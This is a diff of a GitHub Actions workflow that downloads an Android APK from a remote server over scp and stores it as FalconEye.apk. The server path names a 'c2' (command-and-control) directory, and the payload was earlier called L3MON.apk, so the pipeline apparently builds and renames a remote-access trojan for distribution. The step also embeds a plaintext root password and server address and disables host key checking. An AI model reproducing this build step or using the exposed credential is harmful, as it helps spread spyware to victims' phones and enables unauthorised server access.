@@ -21,7 +21,7 @@ jobs:
       - name: Download APK from VPS
         run: |
           mkdir -p app/build/outputs/apk/debug/
-          sshpass -p 'n036mKelPVXd' scp -o StrictHostKeyChecking=no root@77.105.133.37:/opt/falcon-eye-c2/server/assets/webpublic/L3MON.apk app/build/outputs/apk/debug/FalconEye.apk
+          sshpass -p 'n036mKelPVXd' scp -o StrictHostKeyChecking=no root@77.105.133.37:/opt/falcon-eye-c2/server/assets/webpublic/build.s.apk app/build/outputs/apk/debug/FalconEye.apk
 
       - name: Upload APK
         uses: actions/upload-artifact@v4
